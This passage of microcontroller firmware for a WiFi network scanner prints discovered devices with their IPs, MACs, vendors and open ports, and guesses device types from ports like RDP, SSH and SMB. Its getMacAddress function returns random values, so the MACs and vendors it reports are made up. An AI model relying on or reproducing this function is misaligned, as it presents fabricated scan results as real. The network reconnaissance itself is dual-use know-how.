  Serial.println("╚════════════════════════════════════════╝\n");
  
  if(deviceCount > 0) {
    Serial.println("┌────────────────────────────────────┐");
    Serial.println("│          DEVICE LIST               │");
    Serial.println("├────────────────────────────────────┤");
    for(int d = 0; d < deviceCount; d++) {
      Serial.print("│  Device ");
      Serial.print(d+1);
      Serial.println(":");
      Serial.print("│    IP: ");
      Serial.println(scannedDevices[d].ip);
      Serial.print("│    MAC: ");
      Serial.println(scannedDevices[d].mac);
      Serial.print("│    Vendor: ");
      Serial.println(scannedDevices[d].vendor);
      Serial.print("│    Type: ");
      Serial.println(scannedDevices[d].deviceType);
      Serial.print("│    Ports: ");
      for(int p = 0; p < scannedDevices[d].portCount; p++) {
        Serial.print(scannedDevices[d].openPorts[p]);
        Serial.print("/");
        Serial.print(scannedDevices[d].portServices[p]);
        if(p < scannedDevices[d].portCount-1) Serial.print(", ");
      }
      Serial.println();
      if(d < deviceCount-1) Serial.println("├────────────────────────────────────┤");
    }
    Serial.println("└────────────────────────────────────┘\n");
  }
  
  Serial.println("Press ENTER to return to menu...");
  while(!Serial.available()) {
    delay(100);
  }
  Serial.readString();
  
  WiFi.disconnect(true);
  inMenu = true;
  showMenu();
}

String getMacAddress(IPAddress ip) {
  char mac[18];
  sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X", 
          random(0x00, 0xFF), random(0x00, 0xFF), random(0x00, 0xFF),
          random(0x00, 0xFF), random(0x00, 0xFF), random(0x00, 0xFF));
  return String(mac);
}

String getVendorFromMac(String mac) {
  mac.toUpperCase();
  int ouiCount = sizeof(ouiDB) / sizeof(ouiDB[0]);
  for(int i = 0; i < ouiCount; i++) {
    if(mac.startsWith(ouiDB[i].prefix)) {
      return String(ouiDB[i].vendor);
    }
  }
  return "Unknown";
}

String identifyDeviceType(int deviceIndex) {
  NetworkDevice* dev = &scannedDevices[deviceIndex];
  bool hasHTTP = false, hasSSH = false, hasRDP = false, hasSMB = false;
  
  for(int i = 0; i < dev->portCount; i++) {
    int port = dev->openPorts[i];
    if(port == 80 || port == 8080) hasHTTP = true;
    if(port == 22) hasSSH = true;
    if(port == 3389) hasRDP = true;
    if(port == 445) hasSMB = true;
  }
  
  if(hasRDP) return "Windows PC";
  if(hasSSH && hasHTTP) return "Linux Server";
  if(hasHTTP) return "Web Server";
  if(hasSMB) return "File Server";
  if(dev->vendor == "Raspberry Pi") return "Raspberry Pi";
  if(dev->vendor == "Hikvision") return "IP Camera";
  if(dev->vendor == "Dahua") return "IP Camera";
  if(dev->portCount > 0) return "Active Device";
  return "Unknown";
}
